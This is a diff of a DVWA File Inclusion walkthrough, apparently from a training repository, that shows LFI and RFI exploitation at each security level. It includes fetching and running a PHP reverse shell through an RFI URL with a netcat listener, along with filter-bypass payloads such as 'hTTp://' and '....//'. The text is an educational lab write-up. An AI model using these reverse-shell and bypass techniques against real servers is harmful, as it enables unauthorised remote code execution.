@@ -52,7 +52,7 @@ $file = $_GET[ 'page' ];
 So we can see that the parameter is missing any validation.
 
 The objective of this exercise is to gain access to `../hackable/flags/fi.php` and to read all five quotes.
-The exact payload does not work, but going back one more directory will include the file into the page.
+The exact payload does not work, but going back one more directory we will successfully include the file into the page.
 
 <p align="center">
   <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/File-Inclusion/!images/fi5.png?raw=true">
@@ -92,11 +92,11 @@ Now, on our page we will be able to see the content of the files from other doma
 RFI is more dangerous than LFI because usually leads to Remote Code Execution.
 For the next example we will host a python server and use a reverse shell for the RFI vulnerability.
 
-A php reverse shell can be downloaded from here: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
-Edit it with the ip of your machine and the port you want to use, for this example the ip will be 127.0.0.1 and port 4444.
-Start a python server at the location of the reverse shell file: `python3 -m http.server 4445`
-Start a netcat listener: `nc -lvnp 4444`
-And now we can access the URL: `http://localhost/DVWA/vulnerabilities/fi/?page=http://127.0.0.1:4445/rev.php`
+A php reverse shell can be downloaded from here: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php <br />
+Edit it with the ip of your machine and the port you want to use, for this example the ip will be 127.0.0.1 and port 4444.<br />
+Start a python server at the location of the reverse shell file: `python3 -m http.server 4445`<br />
+Start a netcat listener: `nc -lvnp 4444`<br />
+And now we can access the URL: `http://localhost/DVWA/vulnerabilities/fi/?page=http://127.0.0.1:4445/rev.php`<br />
 Now we have access on the server and we can go and read the `/hackable/flags/fi.php` file.
 
 <p align="center">
@@ -109,6 +109,69 @@ Note: In order to practice on RFI exercise, `allow_url_include` option should be
 
 ## Medium Security
 
+Source code:
+```php
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+$file = str_replace( array( "http://", "https://" ), "", $file );
+$file = str_replace( array( "../", "..\\" ), "", $file );
+
+?> 
+```
+
+For the medium level we can see that we have some filters implemented. These filters are not enough, because can be easily bypassed.<br />
+To bypass `http://` we can use uppercase letters such as `hTTp://`.<br/>
+And for `../` we can use `....//`. The match will be triggered once and the rest will apply normally. `..[../]/`.
+
 ## High Security
 
+Source code:
+```php
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
+    // This isn't the page we want!
+    echo "ERROR: File not found!";
+    exit;
+}
+
+?> 
+```
+
+For this exercise, the file value starts with `file*` or is equal to `include.php` (this is the initial value).<br />
+When we open a local file with a browser, we have the URL in the format: `file:///home/ubuntu/document.txt`, so we can use this syntax in order to read the file that we want.
+
+<p align="center">
+  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/File-Inclusion/!images/fi10.png?raw=true">
+</p>
+
+The only problem is that we need to know the full path to the file, but we can fuzz the URL until we get it.
+For the RFI challenge, we need to chain the vulnerability with other one, such as File Upload, in order to upload a reverse shell and then to execute it using File Inclusion `file:///var/www/html/dvwa/shell.php`.
+
 ## Impossible Security
+
+Source code:
+```php
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Only allow include.php or file{1..3}.php
+if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
+    // This isn't the page we want!
+    echo "ERROR: File not found!";
+    exit;
+}
+
+?> 
+```
+For the Impossible level, the value of the parameter must be one of the files enumerated above. In this case we are not able to bypass it.
